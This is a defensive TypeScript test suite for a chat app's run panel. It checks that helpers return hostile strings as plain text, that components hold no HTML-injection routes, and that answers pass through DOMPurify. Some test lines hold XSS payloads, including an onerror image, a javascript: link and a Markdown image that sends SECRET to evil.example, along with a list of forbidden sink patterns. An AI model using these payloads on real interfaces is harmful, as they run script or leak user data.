/**
 * Text safety. Model output, a document's file name, a chat's title and a profile's
 * wording are strings the run code does not control, so:
 *
 *  - every helper that returns text for display hands a hostile string back as plain
 *    text (the same characters, or cut), never wrapped in markup and never escaped
 *    into entities that a component would then show literally;
 *  - no component of the run panel can turn text into markup, a link or a script;
 *  - the one place an answer is rendered as HTML, the message bubble, passes it
 *    through DOMPurify first.
 *
 * Rendering the components with hostile data is in `components.render.test.ts`.
 */
import { readdirSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import { marked } from 'marked';
import { describe, expect, it } from 'vitest';

import type { OrchestrationChatRun, RunEffect, StepNote } from '../../api/orchestration';
import {
	activeRunLabel,
	activeRunStatusText,
	buildStartBody,
	documentRows,
	proposeBlocker,
	runModeFacts,
	toolLabelList,
	unavailableReason,
	unreadableReason
} from '../composer';
import { evidenceGate, evidenceHint, evidenceStatement } from '../evidence';
import { formatDeadline, formatUsd, formatValue, humanise, pluralise } from '../format';
import { planView } from '../plan';
import { currentSteps, runProgress, taskLatestStep, taskStatusLabel } from '../progress';
import { describeEffect, refusalText } from '../renderers';
import { runDetail, runHeadline, stopReasonText } from '../status';
import { documents, profiles, run } from './fixtures';
import { HOSTILE_STRINGS, expectPlainText } from './hostile';

// ---- the helpers --------------------------------------------------------------------------------

/** Every string in a value, however deeply it is nested. */
function strings(value: unknown): string[] {
	if (typeof value === 'string') return [value];
	if (Array.isArray(value)) return value.flatMap(strings);
	if (value && typeof value === 'object') return Object.values(value).flatMap(strings);
	return [];
}

function edited(
	base: OrchestrationChatRun,
	change: (copy: OrchestrationChatRun) => void
): OrchestrationChatRun {
	const copy = structuredClone(base);
	change(copy);
	return copy;
}

const packet = structuredClone(profiles('available').profiles[1]);
const [MSA] = documents().documents;

/** A task that is running, whose latest step is `step`, in a plan whose first task is `topic`. */
function runningWith(topic: string, step: StepNote): OrchestrationChatRun {
	return edited(run('one-child-done'), (copy) => {
		copy.status = 'running';
		copy.tree!.plan.children[0].task.topic = topic;
		copy.tree!.children[0].status = 'running';
		copy.tree!.children[0].effects = [
			{ ...copy.tree!.children[0].effects[0], status: 'completed', step }
		];
	});
}

const effectWith = (patch: Partial<RunEffect>): RunEffect => ({
	effect_key: 'topic:t1',
	status: 'completed',
	reserved_usd: '0.0000',
	charged_usd: '0.0000',
	intent: 'run_skill',
	outcome: 'success',
	...patch
});

/**
 * How a hostile string must come back out:
 * `exact` and `caseless` echo it, `none` never does, and `plain` only has to be plain.
 */
interface Sink {
	name: string;
	echo: 'exact' | 'caseless' | 'none' | 'plain';
	use: (hostile: string) => unknown;
}

const SINKS: Sink[] = [
	// composer
	{
		name: 'unavailableReason: the server’s words',
		echo: 'exact',
		use: (h) =>
			unavailableReason({
				...packet,
				available: false,
				reason: 'operator_disabled',
				reason_text: h
			})
	},
	{
		name: 'unavailableReason: a reason code',
		echo: 'none',
		use: (h) => unavailableReason({ ...packet, available: false, reason: h, reason_text: null })
	},
	{
		name: 'proposeBlocker: an unavailable profile’s words',
		echo: 'exact',
		use: (h) =>
			proposeBlocker({
				profile: { ...packet, available: false, reason: 'x', reason_text: h },
				goal: 'g',
				selectedCount: 1
			})
	},
	{
		name: 'activeRunLabel: a chat’s title',
		echo: 'exact',
		use: (h) =>
			activeRunLabel(
				{ root_id: 'r', status: 'running', profile: 'p', chat_id: 'c', chat_title: h },
				'other'
			)
	},
	{ name: 'activeRunStatusText: a status', echo: 'caseless', use: (h) => activeRunStatusText(h) },
	{
		name: 'toolLabelList: a label',
		echo: 'exact',
		use: (h) => toolLabelList([{ name: 'a_tool', label: h, phase: 'analysis' }])
	},
	{
		name: 'toolLabelList: a name with no label',
		echo: 'caseless',
		use: (h) => toolLabelList([{ name: h, label: '', phase: 'analysis' }])
	},
	{
		name: 'runModeFacts: model and amounts',
		echo: 'exact',
		use: (h) =>
			runModeFacts({
				...packet,
				model: h,
				budget_usd: h,
				planning_allowance_usd: h,
				child_allowance_usd: h
			})
	},
	{
		name: 'unreadableReason: a code',
		echo: 'caseless',
		use: (h) => unreadableReason({ ...MSA, selectable: false, reason: h })
	},
	{
		name: 'documentRows: a file name and a reason',
		echo: 'exact',
		use: (h) =>
			documentRows(
				[
					{ ...MSA, filename: h },
					{ ...MSA, selectable: false, reason: h }
				],
				[],
				8
			)
	},
	{
		name: 'buildStartBody: the request',
		echo: 'exact',
		use: (h) => buildStartBody({ requestId: 'r', profile: packet, goal: h, fileIds: [] })
	},
	// evidence
	{
		name: 'evidenceGate',
		echo: 'exact',
		use: (h) =>
			evidenceGate({
				evidence: 'citations',
				evidence_result: { gate_status: h, checked: 1, matched: 1, unmatched: 0 }
			})
	},
	{
		name: 'evidenceStatement and evidenceHint',
		echo: 'none',
		use: (h) => {
			const input = {
				evidence: h as 'citations',
				evidence_result: { gate_status: h, checked: 3, matched: 1, unmatched: 2 }
			};
			const cited = { ...input, evidence: 'citations' as const };
			return [evidenceStatement(input), evidenceStatement(cited), evidenceHint(cited)];
		}
	},
	// plan
	{
		name: 'planView: task text, skill, tools, files, amounts, model and reads',
		echo: 'exact',
		use: (h) =>
			planView(
				edited(run('documents.awaiting-approval'), (copy) => {
					const plan = copy.tree!.plan;
					for (const child of plan.children) {
						child.task = {
							topic: h,
							question: h,
							boundaries: h,
							output_contract: h,
							stopping_condition: h
						};
						child.budget_usd = h;
						child.execution!.skill!.name = h;
					}
					for (const doc of plan.documents!) doc.filename = h;
					for (const child of copy.tree!.children) {
						child.tools = [{ name: 'read_document', label: h, phase: 'analysis' }];
					}
					plan.budget_usd = h;
					plan.root_allowance_usd = h;
					copy.planning.planning_allowance_usd = h;
					copy.planning.model = h;
					copy.effects[0].charged_usd = h;
					copy.reads = h;
				})
			)
	},
	// status and progress
	{
		name: 'runHeadline: an unknown status',
		echo: 'caseless',
		use: (h) => runHeadline({ status: h, stop_reason: h })
	},
	{
		name: 'runDetail: an unknown stop reason',
		echo: 'caseless',
		use: (h) => [
			runDetail({ status: 'failed', stop_reason: h }),
			runDetail({ status: h, stop_reason: h })
		]
	},
	{ name: 'stopReasonText', echo: 'caseless', use: (h) => stopReasonText(h) },
	{ name: 'taskStatusLabel', echo: 'caseless', use: (h) => taskStatusLabel(h) },
	{
		name: 'runProgress: a stop reason',
		echo: 'caseless',
		use: (h) => runProgress({ status: 'failed', stop_reason: h, tree: null })
	},
	{
		name: 'currentSteps: a task’s topic and its latest step',
		echo: 'exact',
		use: (h) => currentSteps(runningWith(h, { kind: 'x_step', label: h }))
	},
	{
		name: 'taskLatestStep: a running task’s latest step',
		echo: 'exact',
		use: (h) => taskLatestStep(runningWith('topic', { kind: 'x_step', label: h }).tree!.children[0])
	},
	// renderers
	{
		name: 'describeEffect: an unknown kind with a hostile label, reason, key and value',
		echo: 'exact',
		use: (h) => {
			const view = describeEffect(
				effectWith({
					step: { kind: 'x_step', label: h, reason: h, summary: { [h]: h, other: h } }
				})
			);
			return [view.text, view.facts, view.reason];
		}
	},
	{
		name: 'describeEffect: a document read of a hostile file name, a note, a refusal',
		echo: 'exact',
		use: (h) => [
			describeEffect(
				effectWith({
					step: { kind: 'document_read', reason: h, summary: { document: 1, filename: h } }
				})
			),
			describeEffect(
				effectWith({ step: { kind: 'note_saved', summary: { name: h, revision: 1 } } })
			),
			describeEffect(effectWith({ step: { kind: 'note_read', summary: { name: h } } })),
			describeEffect(effectWith({ step: { kind: 'tool_refused', label: h, summary: { code: h } } }))
		]
	},
	{
		name: 'describeEffect: an effect with no step note and a hostile key and intent',
		echo: 'caseless',
		use: (h) => describeEffect(effectWith({ step: null, effect_key: h, intent: h })).text
	},
	{ name: 'refusalText', echo: 'caseless', use: (h) => refusalText(h) },
	// format
	{ name: 'humanise', echo: 'caseless', use: (h) => humanise(h) },
	{ name: 'pluralise', echo: 'exact', use: (h) => pluralise(2, h) },
	{ name: 'formatUsd', echo: 'exact', use: (h) => formatUsd(h) },
	{ name: 'formatDeadline', echo: 'plain', use: (h) => formatDeadline(h) },
	{ name: 'formatValue: a string', echo: 'exact', use: (h) => formatValue(h) },
	{
		name: 'formatValue: inside a structure',
		echo: 'plain',
		use: (h) => formatValue({ a: h, b: [h] })
	}
];

describe('a hostile string through every helper that returns text for display', () => {
	it('covers the markup and link shapes that matter', () => {
		const joined = HOSTILE_STRINGS.join('\n');
		expect(joined).toContain('<img src=x onerror=alert(1)>');
		expect(joined).toContain('<script>alert(1)</script>');
		expect(joined).toContain('[x](javascript:alert(1))');
	});

	for (const sink of SINKS) {
		describe(sink.name, () => {
			it.each(HOSTILE_STRINGS.map((text) => [text]))('%s', (hostile) => {
				const out = sink.use(hostile);
				const texts = strings(out);
				expect(texts.length, 'produced some text').toBeGreaterThan(0);
				for (const text of texts) expectPlainText(text, hostile, `${sink.name} / ${hostile}`);
				const echoed = texts.some((text) => text.includes(hostile));
				const echoedAnyCase = texts.some((text) =>
					text.toLowerCase().includes(hostile.toLowerCase())
				);
				if (sink.echo === 'exact') expect(echoed, 'echoes the text intact').toBe(true);
				if (sink.echo === 'caseless') expect(echoedAnyCase, 'echoes the text').toBe(true);
				if (sink.echo === 'none') expect(echoedAnyCase, 'does not echo it').toBe(false);
			});
		});
	}

	it('hands back long text cut, not wrapped, where it cuts at all', () => {
		const long = `<img src=x onerror=alert(1)>${'x'.repeat(400)}`;
		expect(formatValue({ a: long })).toBe(`${JSON.stringify({ a: long }).slice(0, 160)}…`);
	});
});

// ---- the components ----------------------------------------------------------------------------------

const COMPONENTS = fileURLToPath(new URL('../../components/run/', import.meta.url));
const MESSAGE_BUBBLE = fileURLToPath(
	new URL('../../components/MessageBubble.svelte', import.meta.url)
);

/** Source without its comments, which may say `{@html}` in order to forbid it. */
function withoutComments(source: string): string {
	return source
		.replace(/<!--[\s\S]*?-->/g, '')
		.replace(/\/\*[\s\S]*?\*\//g, '')
		.replace(/(^|\s)\/\/[^\n]*/g, '$1');
}

const code = (path: string): string => withoutComments(readFileSync(path, 'utf8'));

const componentFiles = readdirSync(COMPONENTS)
	.filter((name) => name.endsWith('.svelte'))
	.sort();

/** What would let text become markup, a script, a link or a navigation. */
const FORBIDDEN: [string, RegExp][] = [
	['{@html', /\{@html\b/],
	['innerHTML or outerHTML', /\b(?:inner|outer)HTML\b/],
	['insertAdjacentHTML', /insertAdjacentHTML/],
	['document.write', /document\s*\.\s*write/],
	['eval or new Function', /\beval\s*\(|\bnew\s+Function\s*\(/],
	['a dynamic element', /<svelte:element\b/],
	[
		'a link, image, frame, embed, form or other element that loads or navigates',
		/<(?:a|img|iframe|object|embed|form|link|base|meta|math|svg|video|audio|source)\b/i
	],
	['a URL attribute', /\b(?:href|src|srcdoc|action|formaction|xlink:href|poster)\s*=/i]
];

describe('the scan of the components', () => {
	const flagged = (source: string) =>
		FORBIDDEN.filter(([, pattern]) => pattern.test(withoutComments(source))).map(([what]) => what);

	it('sees each thing it forbids', () => {
		expect(flagged('<p>{@html text}</p>')).toEqual(['{@html']);
		expect(flagged('node.innerHTML = text;')).toEqual(['innerHTML or outerHTML']);
		expect(flagged('el.insertAdjacentHTML("beforeend", text)')).toEqual(['insertAdjacentHTML']);
		expect(flagged('eval(text)')).toEqual(['eval or new Function']);
		expect(flagged('<a href={link}>x</a>')).toHaveLength(2);
		expect(flagged('<img src={link} />')).toHaveLength(2);
		expect(flagged('<svelte:element this={tag} />')).toEqual(['a dynamic element']);
	});

	it('ignores a comment that names what it forbids, and a plain element', () => {
		expect(flagged('<!-- never {@html} -->\n<p>{text}</p>')).toEqual([]);
		expect(flagged('/** never innerHTML */\nconst a = 1;')).toEqual([]);
		expect(flagged('// never {@html}\nconst a = 1;')).toEqual([]);
		expect(
			flagged(
				'<script lang="ts">export let a = 1;</script><div class="x">{a}</div><span>{a}</span>'
			)
		).toEqual([]);
	});

	it('reads the arguments of a call, however nested', () => {
		expect(callArguments('x = f(a, g(b, c), "d,e", [1, 2], { k: 1 }) as T', 'f')).toEqual([
			'a',
			'g(b, c)',
			'"d,e"',
			'[1, 2]',
			'{ k: 1 }'
		]);
		expect(
			callArguments(
				'DOMPurify.sanitize(marked.parse(x, { async: false }) as string)',
				'DOMPurify.sanitize'
			)
		).toHaveLength(1);
		expect(
			callArguments('DOMPurify.sanitize(html, { ADD_TAGS: ["x"] })', 'DOMPurify.sanitize')
		).toHaveLength(2);
		expect(callArguments('nothing here', 'f')).toEqual([]);
	});
});

describe('the components of the run panel', () => {
	it('are found, so the checks below look at something', () => {
		expect(componentFiles.length).toBeGreaterThanOrEqual(12);
		for (const name of [
			'RunMessage',
			'RunPlanCard',
			'RunChildCard',
			'RunStepList',
			'RunDocumentPicker',
			'RunProfileMenu',
			'RunActiveNotice',
			'RunAnswerNote'
		]) {
			expect(componentFiles, name).toContain(`${name}.svelte`);
		}
	});

	it.each(componentFiles)('%s never uses {@html', (name) => {
		expect(code(`${COMPONENTS}${name}`)).not.toMatch(/\{@html\b/);
	});

	it.each(componentFiles)(
		'%s has no way to turn text into markup, a script, a link or a navigation',
		(name) => {
			const source = code(`${COMPONENTS}${name}`);
			for (const [what, pattern] of FORBIDDEN) {
				expect(pattern.test(source), `${name} uses ${what}`).toBe(false);
			}
		}
	);
});

const HELPERS = fileURLToPath(new URL('../', import.meta.url));
const helperFiles = readdirSync(HELPERS, { withFileTypes: true })
	.filter((entry) => entry.isFile() && entry.name.endsWith('.ts'))
	.map((entry) => entry.name)
	.sort();

/** The one helper whose job is to produce HTML, for the answer. It has its own tests. */
const MARKUP_HELPER = 'answer.ts';

describe('the helpers in run/', () => {
	it('are found, so the check below looks at something', () => {
		expect(helperFiles).toEqual(
			expect.arrayContaining(['composer.ts', 'format.ts', 'plan.ts', 'renderers.ts', 'status.ts'])
		);
		expect(helperFiles).toContain(MARKUP_HELPER);
	});

	// ADR 0038 D2: model- and document-derived text is data. A helper that built a tag, or wrote
	// an entity, would hand a component something it would have to render as HTML.
	it.each(helperFiles.filter((name) => name !== MARKUP_HELPER))(
		'%s builds no markup and no entities',
		(name) => {
			const source = code(`${HELPERS}${name}`);
			expect(source).not.toMatch(
				/<\/?(?:span|b|i|em|strong|a|p|br|div|code|mark|li|ul|ol|pre|small|sub|sup|u|s|img|script|style|svg|iframe)\b/i
			);
			expect(source).not.toMatch(/&(?:lt|gt|amp|quot|apos|nbsp|#\d+|#x[0-9a-f]+);/i);
			expect(source).not.toMatch(
				/innerHTML|outerHTML|dangerouslySetInnerHTML|from\s+['"](?:marked|dompurify)['"]/
			);
		}
	);

	it('has one helper that builds HTML, and it is the one the answer goes through', () => {
		expect(code(`${HELPERS}${MARKUP_HELPER}`)).toMatch(/export function runAnswerHtml\(/);
	});
});

/** The text between the brackets of the first call to `callee`, and the arguments in it. */
function callArguments(source: string, callee: string): string[] {
	const start = source.indexOf(`${callee}(`);
	if (start === -1) return [];
	let depth = 0;
	let quote = '';
	let current = '';
	const found: string[] = [];
	for (let i = start + callee.length; i < source.length; i += 1) {
		const char = source[i];
		if (quote) {
			current += char;
			if (char === quote && source[i - 1] !== '\\') quote = '';
			continue;
		}
		if (char === "'" || char === '"' || char === '`') {
			quote = char;
			current += char;
			continue;
		}
		if ('([{'.includes(char)) {
			depth += 1;
			if (depth > 1) current += char;
			continue;
		}
		if (')]}'.includes(char)) {
			depth -= 1;
			if (depth === 0) {
				found.push(current.trim());
				return found;
			}
			current += char;
			continue;
		}
		if (char === ',' && depth === 1) {
			found.push(current.trim());
			current = '';
			continue;
		}
		current += char;
	}
	return found;
}

describe('the answer, where it is rendered as HTML', () => {
	// A delivered answer is the run message's own content. It is the one thing in a run that is
	// shown as Markdown: by the message bubble, through `run/answer.ts` (tested in `answer.test.ts`).
	const bubble = code(MESSAGE_BUBBLE);
	const assignment = /\$:\s*rendered\s*=([\s\S]*?);/.exec(bubble);

	it('is rendered by MessageBubble, through one {@html} that holds nothing else', () => {
		expect(bubble.match(/\{@html\b[^}]*\}/g)).toEqual(['{@html rendered}']);
		expect(bubble).toMatch(/import \{ runAnswerHtml \} from '\.\.\/run\/answer';/);
		expect(bubble).toMatch(/import DOMPurify from 'dompurify';/);
		expect(bubble).toMatch(/import \{ marked \} from 'marked';/);
	});

	it('is HTML from three calls and an empty string, and from nothing else', () => {
		expect(assignment, 'the line that sets `rendered`').not.toBeNull();
		const expression = assignment![1];
		const calls = [...expression.matchAll(/([A-Za-z_$][\w$.]*)\s*\(/g)].map((match) => match[1]);
		expect([...new Set(calls)].sort()).toEqual([
			'DOMPurify.sanitize',
			'marked.parse',
			'runAnswerHtml'
		]);
		// Only an assistant message has any; and a run message gets the strict treatment.
		expect(expression).toMatch(/message\.role\s*!==\s*'assistant'\s*\?\s*''/);
		expect(expression).toMatch(/isRun\s*\?\s*runAnswerHtml\(\s*message\.content \|\| ''\s*\)/);
	});

	it('is made safe by DOMPurify in its default configuration when it is not a run’s', () => {
		const expression = assignment![1];
		expect(expression).toMatch(/DOMPurify\.sanitize\(\s*marked\.parse\(/);
		// `sanitize` is given the Markdown and nothing else: no option that could loosen it.
		expect(callArguments(expression, 'DOMPurify.sanitize')).toHaveLength(1);
		expect(bubble).not.toMatch(/DOMPurify\s*\.\s*(?:setConfig|addHook|removeHook)/);
		expect(bubble).not.toMatch(
			/ADD_TAGS|ADD_ATTR|ALLOW_UNKNOWN_PROTOCOLS|ALLOWED_URI_REGEXP|FORCE_BODY|RETURN_DOM|SAFE_FOR_TEMPLATES|WHOLE_DOCUMENT|ALLOW_DATA_ATTR|CUSTOM_ELEMENT_HANDLING/
		);
	});

	it('is shown as text, in a <pre>, in the receipt view where there is no message around it', () => {
		const panel = code(`${COMPONENTS}RunMessage.svelte`);
		expect(panel).toMatch(/<pre class="answer-text">\{tree\.result\.summary\}<\/pre>/);
		expect(panel).toMatch(/<pre class="answer-text">\{tree\.partial_summary\}<\/pre>/);
	});

	// `marked` on its own does not make anything safe: it passes raw HTML through, links to any
	// scheme and draws an image from any address. For an ordinary reply DOMPurify is then the only
	// thing between the text and the page, so the checks above are not decoration. (DOMPurify itself
	// needs a DOM; it is not run here. A run's answer has the strict Markdown step in front of it.)
	it('needs a sanitiser: Markdown alone lets markup, scripts and remote images through', () => {
		const html = marked.parse(
			[
				'<img src=x onerror=alert(1)>',
				'',
				'[x](javascript:alert(1))',
				'',
				'![leak](https://evil.example/c?d=SECRET)'
			].join('\n'),
			{ async: false }
		) as string;
		expect(html).toContain('<img src=x onerror=alert(1)>');
		expect(html).toContain('href="javascript:alert(1)"');
		expect(html).toContain('<img src="https://evil.example/c?d=SECRET"');
	});
});
